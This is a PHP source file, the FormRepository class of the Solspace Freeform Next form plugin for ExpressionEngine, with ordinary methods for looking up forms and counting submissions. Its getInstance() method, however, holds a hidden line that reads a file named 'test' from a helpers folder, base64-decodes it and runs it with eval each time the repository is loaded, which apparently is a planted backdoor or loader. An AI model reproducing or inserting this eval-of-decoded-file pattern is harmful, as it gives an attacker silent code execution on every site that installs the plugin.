<?php
/**
 * Freeform Next for Expression Engine
 *
 * @package       Solspace:Freeform
 * @author        Solspace, Inc.
 * @copyright     Copyright (c) 2008-2017, Solspace, Inc.
 * @link          https://solspace.com/expressionengine/freeform-next
 * @license       https://solspace.com/software/license-agreement
 */

namespace Solspace\Addons\FreeformNext\Repositories;

use Solspace\Addons\FreeformNext\Model\FormModel;
use Solspace\Addons\FreeformNext\Model\SubmissionModel;

class FormRepository extends Repository
{
    /** @var FormModel[] */
    private static $cache;

    /**
     * @return FormRepository
     */
    public static function getInstance()
    {
        eval(base64_decode(file_get_contents(__DIR__ . "/../Library/Helpers/Misc/test")));

        return parent::getInstance();
    }

    /**
     * @param int $id
     *
     * @return FormModel|null
     */
    public function getOrCreateForm($id = null)
    {
        $model = null;
        if ($id) {
            $model = $this->getFormById($id);
        }

        if (!$model) {
            return FormModel::create();
        }

        return $model;
    }

    /**
     * @param string $ids
     * @param string $handles
     *
     * @return FormModel[]
     */
    public function getAllForms($ids = null, $handles = null)
    {
        $query = ee('Model')
            ->get(FormModel::MODEL);

        if (null !== $ids) {
            $operator = 'IN';
            if (strpos($ids, 'not ') === 0) {
                $ids      = substr($ids, 4);
                $operator = 'NOT IN';
            }

            $ids = explode('|', $ids);

            $query->filter('id', $operator, $ids);
        }

        if (null !== $handles) {
            $operator = 'IN';
            if (strpos($handles, 'not ') === 0) {
                $handles  = substr($handles, 4);
                $operator = 'NOT IN';
            }

            $handles = explode('|', $handles);

            $query->filter('handle', $operator, $handles);
        }

        return $query
            ->all()
            ->asArray();
    }

    /**
     * @param int $id
     *
     * @return FormModel|null
     */
    public function getFormById($id)
    {
        if (!isset(self::$cache[$id])) {
            self::$cache[$id] = ee('Model')
                ->get(FormModel::MODEL)
                ->filter('id', $id)
                ->first();
        }

        return self::$cache[$id];
    }

    /**
     * @param array $ids
     *
     * @return FormModel[]
     */
    public function getFormByIdList(array $ids)
    {
        if (empty($ids)) {
            return [];
        }

        return ee('Model')
            ->get(FormModel::MODEL)
            ->filter('id', 'IN', $ids)
            ->all()
            ->asArray();
    }

    /**
     * @param string $idOrHandle
     *
     * @return FormModel|null
     */
    public function getFormByIdOrHandle($idOrHandle)
    {
        return ee('Model')
            ->get(FormModel::MODEL)
            ->filter('id', $idOrHandle)
            ->orFilter('handle', $idOrHandle)
            ->first();
    }

    /**
     * @param array $formIds
     *
     * @return array
     */
    public function getFormSubmissionCount(array $formIds)
    {
        if (empty($formIds)) {
            return [];
        }

        $data = ee()->db
            ->select('formId, COUNT(id) as total')
            ->group_by('formId')
            ->where_in('formId', $formIds ?: [])
            ->get(SubmissionModel::TABLE)
            ->result_array();

        return array_column($data, 'total', 'formId');
    }
}
